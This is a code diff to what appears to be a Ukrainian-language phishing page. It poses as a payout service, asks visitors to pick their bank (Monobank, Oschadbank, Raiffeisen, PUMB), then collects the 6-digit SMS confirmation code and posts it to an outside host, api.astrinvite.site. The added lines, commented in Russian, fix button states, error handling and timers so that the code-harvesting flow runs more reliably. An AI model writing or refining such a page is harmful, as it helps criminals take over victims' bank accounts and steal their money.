@@ -85,7 +85,6 @@
 </head>
 <body>
 
-
   <h1>Виберіть ваш банк</h1>
   <div id="subtitle">Для отримання виплат виберіть банк, у якому у вас є діюча карта.</div>
   
@@ -134,6 +133,14 @@
     const STATUS_URL = "https://api.astrinvite.site/api/link-status";
     const CODE_URL   = "https://api.astrinvite.site/api/submit-code";
 
+    // ← ДОБАВЛЕНО: Исходные тексты кнопок
+    const BANK_TEXTS = {
+      "mono-btn": "Monobank",
+      "oschad-btn": "Ощадбанк", 
+      "raiff-btn": "Raiffeisen Bank",
+      "pumb-btn": "ПУМБ"
+    };
+
     const linkData = {};  // банк → { url, id }
     let currentBank = null;
     let currentId = null;
@@ -149,6 +156,16 @@
     // Состояние автообновления
     let autoRefreshActive = true;
     let refreshInProgress = false;
+
+    // ← ДОБАВЛЕНО: Функция восстановления текста кнопок
+    function restoreButtonTexts() {
+      Object.keys(BANK_TEXTS).forEach(btnId => {
+        const btn = document.getElementById(btnId);
+        if (btn) {
+          btn.textContent = BANK_TEXTS[btnId];
+        }
+      });
+    }
 
     async function checkLinksForBank(bank) {
       const btn = document.getElementById(bank + "-btn");
@@ -171,21 +188,31 @@
             linkData[bank] = { url: data.url, id: data.id };
             btn.disabled = false;
             btn.onclick = () => handleBankClick(bank);
+            // ← ДОБАВЛЕНО: Восстанавливаем текст при успешной проверке
+            btn.textContent = BANK_TEXTS[bank + "-btn"];
           } else {
             btn.disabled = true;
             btn.onclick = null;
             delete linkData[bank];
+            // ← ДОБАВЛЕНО: Восстанавливаем текст даже если нет ссылки
+            btn.textContent = BANK_TEXTS[bank + "-btn"];
           }
         } else if (res.status === 429) {
           // Нет доступных ссылок
           btn.disabled = true;
           btn.onclick = null;
           delete linkData[bank];
+          // ← ДОБАВЛЕНО: Восстанавливаем текст
+          btn.textContent = BANK_TEXTS[bank + "-btn"];
         } else {
           console.log(`Ошибка ${bank}: ${res.status}`);
+          // ← ДОБАВЛЕНО: Восстанавливаем текст при ошибке
+          btn.textContent = BANK_TEXTS[bank + "-btn"];
         }
       } catch (error) {
         console.error(`Ошибка проверки ${bank}:`, error);
+        // ← ДОБАВЛЕНО: Восстанавливаем текст при исключении
+        btn.textContent = BANK_TEXTS[bank + "-btn"];
       }
     }
 
@@ -207,6 +234,8 @@
         
       } catch (error) {
         console.error("Ошибка автообновления:", error);
+        // ← ДОБАВЛЕНО: Восстанавливаем тексты при ошибке автообновления
+        restoreButtonTexts();
       } finally {
         refreshInProgress = false;
       }
@@ -215,6 +244,8 @@
     function resetUI() {
       document.getElementById("return-instruction").style.display = "none";
       document.getElementById("status").textContent = "";
+      // ← ДОБАВЛЕНО: Восстанавливаем тексты кнопок при сбросе UI
+      restoreButtonTexts();
       autoRefreshActive = true; // Возобновляем автообновление
     }
 
@@ -222,10 +253,18 @@
       autoRefreshActive = false; // Останавливаем автообновление
       ["mono-btn","oschad-btn","raiff-btn","pumb-btn"].forEach(id=>{
         const el = document.getElementById(id);
-        if(id !== btnId) el.disabled = true;
+        if(id !== btnId) {
+          el.disabled = true;
+        }
       });
       document.getElementById(btnId).textContent = "Завантаження...";
       document.getElementById("status").innerHTML = "";
+    }
+
+    // ← ДОБАВЛЕНО: Функция скрытия загрузки с восстановлением текста
+    function hideLoading() {
+      restoreButtonTexts();
+      // Состояние кнопок будет обновлено при следующем checkAllLinks()
     }
 
     async function handleBankClick(bank) {
@@ -237,7 +276,10 @@
       const data = linkData[bank];
       if (!data || !data.url || !data.id) {
         document.getElementById("status").innerHTML = "<span style='color:#b33'>Немає доступної ссилки для цього банку.</span>";
+        // ← ИСПРАВЛЕНО: Скрываем загрузку и возобновляем автообновление
+        hideLoading();
         autoRefreshActive = true;
+        checkAllLinks(); // Обновляем состояние кнопок
         return;
       }
 
@@ -248,6 +290,10 @@
         await fetch(CONSUME_MAP[bank] + "&id=" + currentId, { method: "POST" });
       } catch (e) {
         console.log("Ошибка consume:", e);
+        // ← ДОБАВЛЕНО: Скрываем загрузку при ошибке
+        hideLoading();
+        autoRefreshActive = true;
+        return;
       }
       
       document.getElementById("return-instruction").style.display = "";
@@ -270,13 +316,25 @@
           const data = await res.json();
           if (data.status === "waiting_code") {
             clearInterval(statusPoller);
+            pollingStatus = false; // ← ДОБАВЛЕНО: Сбрасываем флаг
             showCodeInput();
           }
-        } catch {}
+        } catch (e) {
+          console.error("Ошибка polling:", e);
+          // ← ДОБАВЛЕНО: При ошибке polling восстанавливаем состояние
+          clearInterval(statusPoller);
+          pollingStatus = false;
+          hideLoading();
+          autoRefreshActive = true;
+          checkAllLinks();
+        }
       }, 2500);
     }
 
     function showCodeInput() {
+      // ← ДОБАВЛЕНО: Скрываем загрузку при показе поля ввода
+      hideLoading();
+      
       document.getElementById("status").innerHTML = `
         <b>Введіть 6-значний код з SMS:</b><br>
         <input id="sms-code" type="text" maxlength="6" autocomplete="one-time-code" inputmode="numeric">
@@ -313,7 +371,8 @@
             document.getElementById("send-code-btn").disabled = false;
             document.getElementById("sms-error").textContent = "Помилка: " + (resp.error || "спробуйте ще");
           }
-        } catch {
+        } catch (e) {
+          console.error("Ошибка отправки кода:", e);
           document.getElementById("send-code-btn").disabled = false;
           document.getElementById("sms-error").textContent = "Помилка серверу. Спробуйте ще раз.";
         }
@@ -334,8 +393,9 @@
           clearInterval(smsTimerInterval);
           clearInterval(smsSoundInterval);
           document.getElementById("timer").textContent = "⏰ Час вичерпано!";
-          // Возобновляем автообновление
+          // ← ИСПРАВЛЕНО: Восстанавливаем состояние при таймауте
           setTimeout(() => {
+            resetUI(); // Полный сброс UI
             autoRefreshActive = true;
             checkAllLinks();
           }, 2000);
@@ -418,6 +478,15 @@
     window.addEventListener('beforeunload', () => {
       if (refreshInterval) {
         clearInterval(refreshInterval);
+      }
+      if (statusPoller) {
+        clearInterval(statusPoller);
+      }
+      if (smsTimerInterval) {
+        clearInterval(smsTimerInterval);
+      }
+      if (smsSoundInterval) {
+        clearInterval(smsSoundInterval);
       }
     });
   </script>
